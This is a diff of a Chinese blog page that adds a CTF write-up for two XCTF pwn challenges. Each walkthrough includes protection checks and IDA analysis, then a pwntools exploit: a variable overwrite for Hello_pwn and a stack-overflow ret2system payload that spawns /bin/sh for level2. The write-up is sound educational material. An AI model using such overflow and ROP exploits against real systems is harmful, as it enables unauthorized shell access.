@@ -678,6 +678,14 @@
                                 <span class="chip bg-color">XCTF</span>
                             </a>
                         
+                            <a href="/tags/Pwn/">
+                                <span class="chip bg-color">Pwn</span>
+                            </a>
+                        
+                            <a href="/tags/WP/">
+                                <span class="chip bg-color">WP</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -710,14 +718,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-27
+                    2020-03-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    85
+                    472
                 </div>
                 
 
@@ -743,7 +751,63 @@
                 <p>这篇博客呢，就记录一些平时在XCTF刷的题目的wp，可能整理不开，会分支放；</p>
 <a id="more"></a>
 
-<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这道题</p>
+<h1 id="Hello-pwn"><a href="#Hello-pwn" class="headerlink" title="Hello_pwn"></a>Hello_pwn</h1><p>这个算是第一篇wp了吧，不足之处，还请多多指教；</p>
+<p>拿到题目，按照惯例，先查看保护机制：</p>
+<p><img src="/images/hello_pwn_1.png" alt="hello_pwn_1"></p>
+<p>可以看到，开了NX，未开canary，丢进ida查看伪代码：</p>
+<p><img src="/images/hello_pwn_2.png" alt="hello_pwn_2"></p>
+<p>可以看到这里，先读取一个字符串，再判断如果dword = 1853186401，执行下面那个函数，点进去看：</p>
+<p><img src="/images/hello_pwn_3.png" alt="hello_pwn_3"></p>
+<p>这里直接给了flag了，思路就清晰了吧：只要让<code>dword</code> = 1853186401就可以了</p>
+<p>但是读取的是<code>unk</code>，判断的确是<code>dword</code>，那就看看它们的关系：</p>
+<p><img src="/images/hello_pwn_4.png" alt="hello_pwn_4"></p>
+<p>可以看到，unk和dword偏移量是4个字节，这就好办了呀😁</p>
+<p>直接看exp吧：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.198.29.45'</span><span class="token punctuation">,</span><span class="token number">49503</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof"</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这样就做出来了，\(●ˇ∀ˇ●)/</p>
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这道题题目也给出了，考察的ROP，算是很简单的一道题了；</p>
+<p>先查看保护机制：</p>
+<p><img src="/images/level2_1.png" alt="level2_1"></p>
+<p>开了NX，没有canary</p>
+<p>丢进ida，查看伪代码：</p>
+<p><img src="/images/level2_2.png" alt="level2_2"></p>
+<p>点进vulnerable_function()函数，查看一波：</p>
+<p><img src="/images/level2_3.png" alt="level2_3"></p>
+<p>这里我们发现，read函数极易造成栈溢出漏洞，点进buf，查看空间分配：</p>
+<p><img src="/images/level2_4.png" alt="level2_4"></p>
+<p>这里有buf长度 = （0x88 + 0x4）</p>
+<p>然后搜索字符串，发现”/bin/sh” ,点击进去：</p>
+<p><img src="/images/level2_5.png" alt="level2_5"></p>
+<p>这里就应该清楚了，利用栈溢出漏洞，构造payload覆盖到”/bin/sh”，直接获取shell，那么还得需要寻找system的地址，再寻找一波：</p>
+<p><img src="/images/level2_6.png" alt="level2_6"></p>
+<p>到这里就全部清楚了，上exp：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.198.29.45'</span><span class="token punctuation">,</span><span class="token number">54298</span><span class="token punctuation">)</span>
+
+bin_sh <span class="token operator">=</span> <span class="token number">0x0804A024</span>
+
+system <span class="token operator">=</span> <span class="token number">0x08048320</span>
+
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这道题就做完了，嘻嘻嘻~😀</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -827,6 +891,14 @@
                             
                                 <a href="/tags/XCTF/">
                                     <span class="chip bg-color">XCTF</span>
+                                </a>
+                            
+                                <a href="/tags/Pwn/">
+                                    <span class="chip bg-color">Pwn</span>
+                                </a>
+                            
+                                <a href="/tags/WP/">
+                                    <span class="chip bg-color">WP</span>
                                 </a>
                             
                         </div>
@@ -1023,11 +1095,7 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/HTML/" class="post-category">
-                                    HTML
-                                </a>
-                            
-                            <a href="/categories/HTML/%E5%89%8D%E7%AB%AF/" class="post-category">
+                            <a href="/categories/%E5%89%8D%E7%AB%AF/" class="post-category">
                                     前端
                                 </a>
                             
@@ -1061,9 +1129,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Algorithm">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Algorithm——简单算法总结">
                         
-                        <span class="card-title">Algorithm</span>
+                        <span class="card-title">Algorithm——简单算法总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1286,7 +1354,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
                         <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
                         <br>
                         
-                            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">23.3k</span>&nbsp;字
+                            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">23.8k</span>&nbsp;字
                             
                                 
                                     
